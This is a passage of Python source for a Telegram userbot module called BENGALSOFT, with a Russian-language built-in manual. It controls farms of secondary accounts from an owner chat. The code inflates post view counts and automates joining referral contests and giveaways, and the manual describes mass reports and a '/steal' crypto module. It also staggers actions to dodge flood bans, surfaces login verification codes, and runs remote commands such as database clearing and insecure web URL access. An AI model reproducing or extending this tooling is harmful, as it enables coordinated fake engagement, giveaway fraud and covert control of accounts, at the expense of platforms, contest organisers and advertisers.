            if response.startswith("✅ Отлично, вы приняли участие"):
                answer = self.strings('success_participate')
            elif response.startswith("❗️ Вы уже приняли участие в"):
                answer = self.strings('already_member')
            elif response.startswith("❌ Реферальный конкурс уже завершён!"):
                answer = self.strings('already_finished')
            elif "Для участия нужно подписаться" in response:
                answer = self.strings('no_sponsors')
            return f"<b>♻️ START: <a href='https://t.me/{bot_name}?start={ref_key}'>THEFASTESRUBOT.</a></b>\n{answer}"
        except Exception as e:
            return f"<b>🚫 START:</b> {e}"
        

#=======================================================================================
#=======================================================================================

    
    async def views_post(self, channel_id=None, post_id=None):
        try:
            if not channel_id and not post_id:
                return "VERR1"
            if post_id:
                await self.client(GetMessagesViewsRequest(
                    peer=channel_id,
                    id=[post_id],
                    increment=True)
                )
                return f"VP"
            elif channel_id:
                messages = await self.client.get_messages(
                    channel_id,
                    limit=5
                )
                message_ids = [msg.id for msg in messages]
                if message_ids:
                    await self.client(GetMessagesViewsRequest(
                        peer=channel_id,
                        id=message_ids,
                        increment=True)
                    )
                    return f"VL{len(message_ids)}"
                else:
                    return "VERR2"
        except Exception as e:
            return f", ERR {e}"

            
#=======================================================================================

    async def views_referal_post(self, bot_name):
        try:
            messages = await self.client.get_messages(bot_name, limit=1)
            if not messages or not messages[0].entities:
                return "Post none"
            message = messages[0]
            if message.entities:
                for entity in message.entities:
                    if isinstance(entity, types.MessageEntityTextUrl):
                        url = entity.url
                        if "t.me/c/" in url:
                            channel_id, post_id = url.split("/")[4:6]
                            channel_id = int(channel_id)
                        elif "t.me/" in url:
                            channel_name, post_id = url.split("/")[3:5]
                            channel_id = (await self.client.get_entity(channel_name)).id
                        await self.client(GetMessagesViewsRequest(
                            peer=channel_id,
                            id=[int(post_id)],
                            increment=True)
                        )
                        return f"<a href='{url}'>VIEW</a>"
            return "Link none"
        except Exception as e:
            return f"VIEW RP: {str(e)}"


#=======================================================================================
#=======================================================================================


    async def handle_user_action(self, message):
        try:
            parts = message.message.split()
            mult, delay_s = None, None
            if len(parts) < 3:
                return
            if message.chat_id != self.owner_chat:
                mult, delay_s = 1, 1
            else:
                mult, delay_s = self.get_delay_host(mult)
            mode, target = parts[1], parts[2]
            mode_actions = {
                "bandel": lambda: self.user_multi_ban_del(target),
                "mute": lambda: self.notificator(target, "0"),
                "unmute": lambda: self.notificator(target, "1"),
            }
            if mode in mode_actions and ("t.me/" in target or target.startswith("@")):
                await self.delay_host(delay_s)
                done_message = await mode_actions[mode]()
            else:
                raise Exception(f"error {mode}:")
        except Exception as e:
            done_message = f"<b>🚫 HANDLE ACTION</b>\n{mode}: {e}"
        finally:
            return await self.send_logger_message(
                done_message,
                delay_info = (mult, delay_s) if None not in (mult, delay_s) else None
            )

#=======================================================================================

    async def notificator(self, bot_name, action):
        try:
            peer = await self.client.get_entity(bot_name)
            if action == "0":
                settings = InputPeerNotifySettings(
                    mute_until=2**31 - 1
                )
                await self.client(functions.account.UpdateNotifySettingsRequest(
                    peer=InputNotifyPeer(peer),
                    settings=settings)
                )
                return "🔇 MUTE"
            elif action == "1":
                settings = InputPeerNotifySettings(
                    mute_until=None
                )
                await self.client(functions.account.UpdateNotifySettingsRequest(
                    peer=InputNotifyPeer(peer),
                    settings=settings)
                )
                return "🔊 UNMUTE"
            else:
                return None
        except Exception as e:
            return f"<b>🚫 NOTIFICATOR:</b>\n{e}"

#=======================================================================================

    async def user_multi_ban_del(self, target):
        try:
            if target.startswith("@"):
                username = target[1:]
                link = f"https://t.me/{username}"
            elif "t.me" in target:
                try:
                    user = target.split("t.me/")[1].split("/")[0]
                    link = f"https://t.me/{user}"
                except IndexError:
                    return f"<b> BAN-DEL: INVALID LINK.</b>"
                username = user
            else:
                return f"<b> BAN: INVALID LINK.</b>"
            await self.multi_ban_del(username)
            return f"<b>♻️ BAN-DEL by <a href='{link}'>LINK.</a></b>"
        except ValueError:
            return f"<b> BAN-DEL: INVALID ENTITY.</b>"
        except Exception as e:
            return f"<b> BAN-DEL:</b> {e}"

#=======================================================================================
#=======================================================================================


    async def multi_ban_del(self, bot_name):
        try:
            await self.client(BlockRequest(bot_name))
            await self.client.delete_dialog(bot_name)
            return f"<b>🗑 BLOCKED and DELETED.</b>"
        except Exception as e:
            return f"<b>🗑 BL-DEL: {e}</b>"
        

#=======================================================================================

        
    async def handle_clean(self, message):
        try:
            parts = message.message.split()
            if not self.get("lic_uns", False):
                return
            self.user = await self.client.get_me()
            recipient = message.chat_id
            targets = parts[1:]
            if not message.is_private:
                if len(parts) < 2 or not any(self.user_validator(target_username) for target_username in targets):
                    return
                if recipient == self.owner_chat:
                    mult = 5 if len(targets) > 5 or "all" in targets else 0
                    _, delay_s = self.get_delay_host(mult)
                    await self.delay_host(delay_s)
            buttons = [
                [
                    {
                        "text": "♻️ Старт",
                        "callback": self.clean_start,
                    },
                    {
                        "text": "🚫 Закрыть",
                        "callback": self.clean_cancel
                    }
                ]
            ]
            await self.inline.form(
                message=recipient,
                text="<b>🧨 Запускаем шарманку?</b>",
                reply_markup=buttons,
                always_allow=self.owner_list
            )
        except Exception:
            return

#=======================================================================================

    async def clean_start(self, call, counter = 0):
        try:
            self.cleaner = True
            buttons = [
                [
                    {
                        "text": "БЛЯЯЯЯ СТОП",
                        "callback": self.clean_cancel,
                        "args": (1,)
                    },
                ],
            ]
            await call.edit(
                text=f"<b>⏳ Шарманка работает...</b>",
                reply_markup=buttons
            )
            whitelist = set(self.owner_list) | {self.owner_chat} | set(self.whitelist_soft) | set(self.whitelist_user)
            async for dialog in self.client.iter_dialogs():
                if not self.cleaner:
                    return await call.edit(f"<b>♻️ Шарманка приостановлена! Очищено: {counter}.</b>")
                try:
                    if dialog.id in whitelist:
                        continue
                    if dialog.is_group or dialog.is_channel:
                        if dialog.entity and (
                            getattr(dialog.entity, "creator", False) or 
                            (getattr(dialog.entity, "admin_rights", None) and dialog.entity.admin_rights.add_admins)
                        ):
                            continue
                    await self.client.delete_dialog(dialog.id)
                    counter += 1
                    if counter % 50 == 0:
                        await call.edit(
                            text=f"<b>⏳ Шарманка работает. Очищено: {counter}</b>",
                            reply_markup=buttons
                        )
                    await asyncio.sleep(1)
                except Exception:
                    continue
            return await call.edit(f"<b>♻️ Шарманка отработала! Очищено: {counter}.</b>")
        except Exception as e:
            await call.edit(f"<b>🚫 Ошибка клинера: {e}</b>")
        finally:
            self.cleaner = False

#=======================================================================================

    async def clean_cancel(self, call, mode=None):
        self.cleaner = False
        if mode == 1:
            return
        else:
            return await self.close_form(call)

#=======================================================================================


    async def handle_set_user(self, message):
        try:
            parts, recipient = message.message.split(), message.chat_id
            if message.is_private:
                if len(parts) < 3:
                    return
            else:
                if len(parts) < 4 or not any(self.user_validator(part) for part in parts[3:]):
                    return
                if recipient == self.owner_chat:
                    mult = 3 if len(parts[3:]) > 10 or "all" in parts[3:] else 0
                    await self.delay_host(mult * self.config["group"])
            done_message = await self.update_user_config(
                config_name = parts[1],
                new_value = parts[2]
            )
            return await self.send_custom_message(
                done_message,
                recipient = recipient
            )
        except Exception as e:
            if "list index out of range" in str(e):
                done_message = "NO ARGS"
            else:
                done_message = str(e)
            return await self.send_custom_message(
                f"<b>🚫 HANDLE SET:</b> {done_message}",
                recipient = recipient
            )

#=======================================================================================
    
    async def update_user_config(self, config_name=None, new_value=None):
        try:
            if config_name not in ["logger", "group"]:
                raise Exception(f"{config_name} not found")
            if config_name == "group":
                self.config[config_name] = int(new_value)
                return f"<b>♻️ CFG: {config_name} set to {new_value}</b>"
            elif config_name == "logger":
                self.config[config_name] = self.bool_validator(new_value)
                return f"<b>♻️ CFG: {config_name} set to {new_value}</b>"
            else:
                raise Exception(f"{config_name} not found")
        except Exception as e:
            return f"<b>🚫 CFG: {str(e)}</b>"


#=======================================================================================
#=======================================================================================


    async def handle_reconfig(self, message):
        try:
            done_message = await self.reconfig_param()
            if isinstance(message, str):
                text = message
            else:
                text = message.message
            if text == "init":
                group = self.config.get("group", "N/A")
                logger = "ON" if self.config.get("logger", False) else "OFF"
                return f"<b>INIT PACK {group}, LOGGER {logger}</b>"
            elif text == "/reconfig":
                await self.delay_host(self.config["group"]*5)
                return await self.send_custom_message(f"{done_message}")
            else:
                return
        except Exception as e:
            return await self.send_custom_message(f"🚫 HANDLE SETTINGS ERROR:\n{str(e)}")


#=======================================================================================

    async def reconfig_param(self):
        try:
            if not isinstance(self.settings_list, list):
                return "🚫 Нет списка ссылок"

            if not self.user:
                self.user = await self.client.get_me()
            me = self.user
            my_username = f"@{me.username}" if me.username else None
            if not my_username:
                return "🚫 Нет user, нельзя настроить."

            for n, link in enumerate(self.settings_list, 1):
                channel, post_id = link.split("/")[-2:]
                message = await self.client.get_messages(
                    int(channel),
                    ids=int(post_id)
                )

                if not message or not message.message:
                    continue

                lines = message.message.split('\n')
                if not lines or f"SETTINGS {self.softname} {n}" not in lines[0]:
                    continue

                current_group, result = None, ""
                for line in lines[1:]:
                    line = line.strip()
                    if not line:
                        continue
                    if line.startswith("group"):
                        try:
                            current_group = int(line.split()[1])
                        except:
                            continue
                    elif line.startswith("@") and current_group:
                        username = line.split()[0]
                        if self.user_validator(username):
                            group = await self.update_user_config("group", current_group)
                            result += f"{group}\n"
                            if "logger" in line:
                                logger = await self.update_user_config("logger", True)
                                result += f"{logger}\n"
                            else:
                                logger = await self.update_user_config("logger", False)
                                result += f"{logger}\n"
                            return f"{result}"
            return "🚫 Записи про акк не найдены."
        except Exception as e:
            return f"🚫 RECONFIG: {str(e)}"
        
#=======================================================================================
#=======================================================================================


    async def handle_get_user(self, message):
        try:
            if not self.get("license", False):
                return
            self.user = await self.client.get_me()    
            parts = message.message.split()
            recipient = message.chat_id
            if not message.is_private:
                if len(parts) < 2:
                    return
                param, values = parts[1], parts[2:]
                if param == "group":
                    if str(self.config["group"]) not in values:
                        return
                elif param == "logger":
                    if not values:
                        return
                    value = self.bool_validator(" ".join(values))
                    if self.config["logger"] != value:
                        return
                else:
                    if not any(self.user_validator(part) for part in parts[1:]):
                        return
                if recipient == self.owner_chat:
                    mult = 2 if len(parts[1:]) > 3 or "all" in parts[1:] else 0
                    delay_s = mult * self.config["group"]
                    await self.delay_host(delay_s)
            buttons = [
                [
                    {
                        "text": "♻️ Открыть",
                        "callback": self.get_user_main,
                    },
                    {
                        "text": "🚫 Закрыть",
                        "callback": self.close_form,
                    },
                ]
            ]
            return await self.inline.form(
                message=recipient,
                text="<b>⚙️ Информация об аккаунте</b>",
                reply_markup=buttons,
                always_allow=self.owner_list,
            )
        except Exception:
            pass

#=======================================================================================

    async def get_user_main(self, call):
        try:
            text = "<b>⚙️ Информация об аккаунте</b>"
            buttons = [
                [
                    {
                        "text": "Константы",
                        "callback": self.get_user_constants,
                    },
                    {
                        "text": "Настройки",
                        "callback": self.get_user_settings,
                    },
                ],
                [
                    {
                        "text": "Аккаунт",
                        "callback": self.get_user_account,
                    },
                    {
                        "text": "Сервер",
                        "callback": self.get_user_server
                    },
                ],
                [
                    {
                        "text": "🚫 Закрыть",
                        "callback": self.close_form,
                    },
                ]
            ]
            await call.edit(
                text=text,
                reply_markup=buttons
            )
        except Exception as e:
            return f"<b>❌ INFO: {e}</b>"

#=======================================================================================

    async def get_user_constants(self, call):
        buttons = [
            [
                {
                    "text": "« Назад",
                    "callback": self.get_user_main
                },
                {
                    "text": "🚫 Закрыть",
                    "callback": self.close_form,
                },
            ]
        ]
        await call.edit(
            text=self.strings("waiting"),
            reply_markup=buttons
        )
        owner_list = ", ".join([f"{owner}" for owner in self.owner_list])
        text = (
            "<b>♻️ Системные константы</b>\n\n"
            f"<b>SOFT NAME: {self.softname}</b>\n"
            f"<b>SOFT VERSION: {self.softversion}</b>\n\n"
            f"<b>OWNER USER: {self.owner_user}\n</b>{owner_list}\n\n"
            f"<b>OWNER <a href='{self.owner_link}'>CHAT</a>: {self.owner_chat}</b>\n\n"
        )
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def get_user_settings(self, call):
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.get_user_main
                },
                {
                    "text": "🚫 Закрыть",
                    "callback": self.close_form,
                },
            ]
        ]
        await call.edit(
            text=self.strings("waiting"),
            reply_markup=buttons
        )
        text = (
            "<b>♻️ Текущие параметры</b>\n\n"
            f"<b>logger:</b> {self.config['logger']}\n"
            f"<b>group:</b> {self.config['group']}\n"
            f"<b>selector:</b> {self.selector}"
        )
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def get_user_account(self, call):
        buttons = [
            [
                {
                    "text": "🔎 Найти код", 
                    "callback": self.get_user_verification
                },
            ],
            [
                {
                    "text": "« Назад",
                    "callback": self.get_user_main
                },
                {
                    "text": "🚫 Закрыть",
                    "callback": self.close_form,
                },
            ]
        ]
        await call.edit(
            text=self.strings("waiting"),
            reply_markup=buttons
        )
        text = (
            "<b>♻️ Информация об аккаунте</b>\n\n"
            f"{(self.user.first_name or '') + ' ' + (self.user.last_name or '').strip()}\n"
            f"<b>TAG:</b> {'@' + self.user.username if self.user.username else 'NOTSET'}\n"
            f"<b>NUM:</b> {'+' + self.user.phone if self.user.phone else 'NOTSET'}\n"
            f"<b>UID:</b> <code>{self.user.id}</code>"
        )
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def get_user_server(self, call):
        buttons = [
            [
                {
                    "text": "Обновить",
                    "callback": self.get_user_server
                }
            ],
            [
                {
                    "text": "« Назад",
                    "callback": self.get_user_main
                },
                {
                    "text": "🚫 Закрыть",
                    "callback": self.close_form,
                }
            ]
        ]
        await call.edit(
            text=self.strings("waiting"),
            reply_markup=buttons
        )
        text = await self.get_server_info()
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def get_user_verification(self, call):
        buttons = [
            [
                {
                    "text": "🔄 Обновить",
                    "callback": self.get_user_verification
                }
            ],
            [
                {
                    "text": "« Назад",
                    "callback": self.get_user_main,
                },
                {
                    "text": "🚫 Закрыть",
                    "callback": self.close_form,
                }
            ]
        ]
        await call.edit(
            text=self.strings("waiting"),
            reply_markup=buttons
        )
        text = await self.get_verif_code()
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================
#=======================================================================================


    async def handle_user_system(self, message):
        try:
            if isinstance(message, str):
                text, recipient = message, self.owner_chat
                parts = text.split()
                if len(parts) < 2:
                    return
            else:
                text, recipient = message.message, message.chat_id
                parts = text.split()
                targets = parts[2:]
                if not message.is_private:
                    if len(parts) < 3 or not any(self.user_validator(target_username) for target_username in targets):
                        return
                    if recipient == self.owner_chat:
                        mult = 5 if len(targets) > 7 or "all" in targets else 0
                        _, delay_s = self.get_delay_host(mult)
                        await self.delay_host(delay_s)
            command_handlers = {
                "ping": lambda: self.invoke(
                    "ping", None, recipient
                ),
                "unloadmod": lambda: self.invoke(
                    "unloadmod", "BENGALSOFT", "me"
                ),
                "cleardb": lambda: self.invoke(
                    "cleardb", "force_insecure", recipient
                ),
                "clearlogs": lambda: self.invoke(
                    "clearlogs", None, recipient
                ),
                "weburl": lambda: self.invoke(
                    "weburl", "force_insecure", recipient
                ),
                "config": lambda: self.invoke(
                    "config", "BENGALSOFT", recipient
                ),
            }
            action_type = parts[1].strip().lower()
            if action_type in command_handlers:
                await command_handlers[action_type]()
            else:
                existing_commands = ", ".join(command_handlers.keys())
                await self.send_custom_message(f"<b>🚫 HANDLE SYSTEM.</b> Доступные: {existing_commands}.")
            return
        except Exception as e:
            await self.send_logger_message(f"<b>🚫 HANDLE SYSTEM:</b> {e}")


#=======================================================================================
#=======================================================================================


    async def handle_contacter(self, message):
        try:
            if isinstance(message, str):
                text = message
            else:
                text = message.message
            parts = text.split()
            if len(parts) < 4:
                return
            mode, target, note = parts[1], parts[2], parts[3]
            if target.isdigit():
                target = int(target)
            try:
                user = await self.client.get_entity(target)
            except Exception as e:
                if "Could not find the input entity for PeerUser" in str(e):
                    return False
                else:
                    raise Exception(f"GET ENTITY - {str(e)}")
            if mode == "add":
                await self.client(DeleteContactsRequest(id=[user.id]))
                await self.delay_host(1)
                await self.client(AddContactRequest(
                    id=user.id,
                    first_name=user.first_name,
                    last_name=f" • {note}".strip(),
                    phone="phone",
                    add_phone_privacy_exception=False,
                ))
                done_message = f"♻️ Контакт {target} добавлен."
            elif mode == "del":
                await self.client(DeleteContactsRequest(id=[user.id]))
                done_message = f"♻️ Контакт {target} удален."
            else:
                return
            if text.startswith("init"):
                return True
            else:
                return await self.send_custom_message(done_message)
        except Exception as e:
            await self.send_custom_message(f"🚫 CONTACTER: {str(e)}")
            return False


#=======================================================================================
#=======================================================================================


    async def handle_manual(self, message):
        try:
            parts = message.message.split()
            self.user = await self.client.get_me()
            await self.handle_license()
            if not self.get("license", False):
                return
            if not message.is_private:
                if len(parts) != 2 or not self.user_validator(parts[1]):
                    return
            caption = (
                f"<b>LICENSE <a href='https://t.me/BENGALSOFT'>BENGALSOFT</a></b>\n"
                f"<b>OWNER: {self.softname}</b>\n"
                f"<b>MODULE VERSION: {self.softversion}</b>"
            )
            buttons = [
                [
                    {
                        "text": "♻️ Открыть",
                        "callback": self.manual_main,
                    },
                    {
                        "text": "🚫 Закрыть",
                        "callback": self.close_form,
                    },
                ]
            ]
            return await self.inline.form(
                message=message.chat_id,
                text=caption,
                reply_markup=buttons,
                always_allow=self.owner_list,
            )
        except Exception as e:
            await self.send_custom_message(f"🚫 HANDLE MANUAL: {str(e)}")

#=======================================================================================

    async def manual_main(self, call):
        text = f"<b>{self.owner_user}, выбери раздел:</b>"
        buttons = [
            [
                {
                    "text": "Базис",
                    "callback": self.manual_basic
                },
                {
                    "text": "Команды",
                    "callback": self.manual_commands
                },
                {
                    "text": "Общее",
                    "callback": self.manual_general
                },
            ],
            [
                {
                    "text": "🚫 Закрыть",
                    "callback": self.close_form,
                },
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons,
            photo="https://i.ibb.co/TT3TP4n/BENGAL.jpg"
        )

#=======================================================================================

    async def manual_basic(self, call):
        text = (
            "<b>⚙️ Базовая настройка выполняется с помощью команд /set и /reconfig\n\n"

            "Сначала раздели и пронумеруй все свои аккаунты. "
            "Например, если сервер с 20 сессиями — ставим 4 пачки по 5 штук. Ну или 2 по 10.\n\n"

            "Изначально везде стоит номер 1. Пачка (group) — это множитель, который отвечает за КД. "
            "KD нужно чтобы заданные действия не выполнялись одновременно и тг не дала флудбан.\n\n"

            "Далее для удобства из каждой пачки надо выбрать 1 твинк и включить на них логгер. "
            "Logger отображает результаты выполнения команд софта. Изначально он везде выключен.\n\n"

            "Базовая настройка завершена, продолжай по такому же принципу.</b>"
        )
        buttons = [
            [
                {
                    "text": "/set", 
                    "callback": self.manual_set_param
                },
                {
                    "text": "/reconfig", 
                    "callback": self.manual_reconfig_param
                },
                {
                    "text": "/get", 
                    "callback": self.manual_get_param
                }
            ],
            [
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                },
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons,
            photo="https://i.ibb.co/chC5QPSv/CONFIG.png"
        )

#=======================================================================================

    async def manual_general(self, call):
        text = (
            "<b>Важное по хостам и юзерботам.</b>\n\n"
            "На любом хосте не забывайте держать интервалы между командами. "
            "В идеале — 3-5 минут после завершения прошлого цикла. "
            "Если вы не держите интервалы — сервак ляжет и вы будете ныть. "
            "Команды вы можете отправлять в любом чате где есть ваши твинки, "
            "или вообще в лс конкретному акку. Но лучше в овнерчате.\n\n"
            "Используйте /reconfig для обновления параметров аккаунтов (из "
            "списка в канале) и /license для обновления дб (можно в лс твинку).\n\n"
            "Если вы установили юзербота на VDS - у вас есть доступ к файловой "
            "системе и вы можете спокойно использовать антикапчу."
        )
        buttons = [
            [
                {
                    "text": "HIKKA", 
                    "callback": self.manual_general_hikka
                },
                {
                    "text": "HEROKU", 
                    "callback": self.manual_general_heroku
                },
            ],
            [
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                },
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons,
            photo="https://i.ibb.co/pB0Fd2Dz/HOST.jpg"
        )

#=======================================================================================

    async def manual_general_hikka(self, call):
        text = (
            "<b>🌘 Hikka v1.6.3 on VDS</b>\n\n"

            "Последнее обновление было в 2022г, поэтому тут есть небольшие ограничения. "
            "Однако, в целом, это самый стабильный и удобный юзербот из всех существующих. "
            "У вас есть доступ к .weburl для добавления аккаунтов на сервера.\n\n"

            "Из минусов - в этой версии не поддерживается WEB. "
            "Например, недоступны модули под giveshare, cryptobot giveaway и прочие. "
            "Также в этой версии бот не видит посты с цитатами, например в раннере или реакторе.\n\n"
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_general
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ],
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_general_heroku(self, call):
        text = (
            "<b>🪐 Heroku v1.6.8 on VDS</b>\n\n"

            "Обновления выпускаются регулярно, поэтому ограничений практически нет. "
            "Хероку построен на основе бета-версии Hikka v1.6.4. "
            "Так как это нестабильная сборка - часто встречаются баги. "
            "Например, иногда ломается .weburl. В целом, это тот же самый Hikka.\n\n"

            "Из плюсов - в этой версии поддерживается WEB, цитаты и тд. "
            "Например, вы можете лутать giveshare, cryptobot giveaway и прочие вебаппы. "
            "Посты с цитатами бот тоже спокойно обрабатывает.\n\n"
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_general
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ],
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_set_param(self, call):
        text = (
            "<b>🔗 Установка параметров:</b>\n"
            "/set [param] [value] [users]\n"
            "▫️ logger - логгер (bool)\n"
            "▫️ group - номер пачки (int)\n"
            "▫️ selector - автокоды входа / лс мониторинг (bool)\n\n"
            "Пример:\n"
            "/set logger true @user1 123456789 WORKER228\n\n"
            "BOOL - true/false, on/off, yes/no, 1/0, y/n, t/f.\n"
            "INT - 1, 2, 3, ..., 100...\n"
            "USER - тег, айди, ник, номер. \n"
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_basic
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                },
            ]
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_reconfig_param(self, call):
        text = (
            "<b>🔗 Автонастройка /reconfig</b>\n\n"
            "В своем овнерчате, который к софту привязан, делаешь 3 поста. В каждом пишешь:\n"
            "SETTINGS BENGAL 1, SETTINGS BENGAL 2, SETTINGS BENGAL 3 (BENGAL заменить на свой софт).\n\n"
            "В каждом пишешь group 2 и с новой строки все @юзеры твинков пачки 2 (5-10 шт.). "
            "И дальше по очереди все пачки так же само.\n\n"
            "Напротив одного из аккаунтов каждой пачки пишешь logger. На них он и включится.\n\n"
            "Выполняешь команду /reconfig и аккаунт пропарсит значения из всех постов, найдет себя и "
            "применит к нужные настройки. Если в постах нету значений - оставит базовые.\n\n"
            "*Постов делаем 3 штуки с запасом из-за лимита на длину смс, в каждый влазит штук по 300 аккаунтов. "
            "Ссылки на посты прописаны в модуле, сменить их нельзя. Можно только редактировать сами посты."
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_basic
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ],
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_get_param(self, call):
        text = (
            "<b>🔗 Инфа про акки /get</b>\n\n"
            "Конкретные акки - список из @, ник, номер, айди. Пример:\n/get @user1 123456789\n\n"
            "Все акки - /get all\n\n"
            "Поиск по group (пачкам) - вторым аргументом указываем список групп (int) через пробел. "
            "Пример:\n/get group 2 5 15\n"
            "Выведет все акки с номерами 2, 5 и 15.\n\n"
            "Поиск по logger - вторым аргументом указываем его значение (bool). "
            "Пример:\n/get logger true\n"
            "Выведет все акки с включенным логгером.\n\n"
            "Если в лс пишете - можно просто /get, без валида\n"
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_basic
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                },
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_commands(self, call):
        text = "<b>⚙️ Выберите команду:</b>"
        buttons = [
            [
                {
                    "text": "/sub", 
                    "callback": self.manual_subscribe
                },
                {
                    "text": "/run", 
                    "callback": self.manual_runner
                },
                {
                    "text": "/ref", 
                    "callback": self.manual_referal
                },
            ],
            [
                {
                    "text": "/uns", 
                    "callback": self.manual_unsubscribe
                },
                {
                    "text": "/clean", 
                    "callback": self.manual_clean
                },
                {
                    "text": "/report", 
                    "callback": self.manual_reporter
                },
            ],
            [
                {
                    "text": "/tegive", 
                    "callback": self.manual_tegive
                },
                {
                    "text": "/cryptogive",
                    "callback": self.manual_cryptogive
                },
            ],
            [
                {
                    "text": "/react", 
                    "callback": self.manual_reactor
                },
                {
                    "text": "/action", 
                    "callback": self.manual_action
                },
                {
                    "text": "/system", 
                    "callback": self.manual_system
                },
            ],
            [
                {
                    "text": "Менеджер ЛС",
                    "callback": self.manual_pm_manager
                },
                {
                    "text": "В доработке",
                    "callback": self.manual_commands_dorabotki
                },
            ],
            [
                {
                    "text": "« На главную",
                    "callback": self.manual_main
                },
            ]
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons,
            photo="https://i.ibb.co/9kw9WX5g/COMMANDS.png"
        )

#=======================================================================================

    async def manual_commands_dorabotki(self, call):
        text = "<b>⚙️ Выберите команду (модули рабочие, но на доработке):</b>"
        buttons = [
            [
                {
                    "text": "/steal",
                    "callback": self.manual_cryptosteal
                },
                {
                    "text": "/giveshare",
                    "callback": self.manual_giveshare
                },
            ],
            [
                {
                    "text": "/infochan",
                    "callback": self.manual_infochan
                },
                {
                    "text": "/sms", 
                    "callback": self.manual_sms
                },
                {
                    "text": "/contact",
                    "callback": self.manual_contacter
                }
            ],
            [
                {
                    "text": "« Назад",
                    "callback": self.manual_commands
                },
                {
                    "text": "« На главную",
                    "callback": self.manual_main
                }
            ],
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================
    
    async def manual_pm_manager(self, call):
        access = "✅ Доступен к использованию" if self.get("lic_pmm", False) else "❌ Доступ запрещен"
        text = (
            f"<b>📝 Менеджер чатов ЛС</b>\n{access}\n\n"
            "Не имеет команд. Можно только включить или выключить. "
            "Он мониторит коды для входа и выводит их, а также все лс чаты твинков. "
            "Выводит вам текстовые смс с возможностью просмотреть, ответить, "
            "поставить реакцию, забанить, замутить и тд."
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ],
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================
    async def manual_subscribe(self, call):
        access = "✅ Доступен к использованию" if self.get("lic_sub", False) else "❌ Доступ запрещен"
        text = (
            f"<b>📝 Подписки на каналы / чаты</b>\n{access}\n\n"
            "🔗 /sub [mult] [target]\n"
            "▫️ [mult] - множитель задержки (необязательно)\n"
            "▫️ [target] - публичная (можно даже на пост) или приватная ссылка, @username, можно несколько\n\n"
            "Примеры:\n"
            "/sub @channel1 @channel2\n"
            "/sub 5 https://t.me/channel\n"
            "/sub 10 t.me/channel\n"
            "/sub https://t.me/channel/123\n"
            "/sub https://t.me/+hash\n\n"
            "Примечание:\n"
            "Идут просмотры на последние посты и автоархивация.\n"
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_unsubscribe(self, call):
        access = "✅ Доступен к использованию" if self.get("lic_uns", False) else "❌ Доступ запрещен"
        text = (
            f"<b>📝 Отписка от каналов / чатов</b>\n{access}\n\n"
            "🔗 /uns [mult] [target]\n"
            "▫️ [mult] - множитель задержки (необязательно)\n"
            "▫️ [target] - публичная или приватная ссылка (можно даже на пост), @username, ID (без минуса), можно несколько\n\n"
            "Примеры:\n"
            "/uns @channel\n"
            "/uns 2 t.me/channel"
            "/uns 10 https://t.me/c/123/456\n"
            "/uns 123456789 987654321"
        )
        buttons = [
            [
                {
                    "text": "« Назад",
                    "callback": self.manual_commands
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_runner(self, call):
        access = "✅ Доступен к использованию" if self.get("lic_run", False) else "❌ Доступ запрещен"
        text = (
            f"<b>📝 Инлайн раннер</b>\n{access}\n\n"
            "🔗 /run [mult] [link]\n"
            "▫️ [mult] - множитель задержки (необязательно)\n"
            "▫️ [link] - ссылка на пост с кнопкой\n\n"
            "Примеры:\n"
            "/run https://t.me/channel/123\n"
            "/run 20 t.me/c/123/456\n\n"
            "Примечание:\n"
            "На пост розыгрыша идут просмотры.\n"
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_referal(self, call):
        access = "✅ Доступен к использованию" if self.get("lic_ref", False) else "❌ Доступ запрещен"
        text = (
            f"<b>📝 Текстовые реферальники</b>\n{access}\n\n"
            "🔗 /ref [mult] [link]\n"
            "▫️ [mult] - множитель задержки (необязательно)\n"
